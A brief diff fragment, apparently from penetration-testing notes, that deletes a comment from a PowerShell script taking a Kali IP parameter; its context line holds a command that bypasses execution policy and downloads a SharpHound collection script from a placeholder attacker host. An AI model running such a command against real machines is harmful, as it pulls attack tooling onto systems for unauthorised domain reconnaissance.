@@ -15,8 +15,6 @@ powershell -ep bypass -c "IWR http://<KALI_IP>/auto_sharphound.ps1 -OutFile auto
 ```
 
 ```powershell
-# auto.ps1 - With your requested status messages
-
 param([string]$KaliIP)
 
 if (-not $KaliIP) { exit }
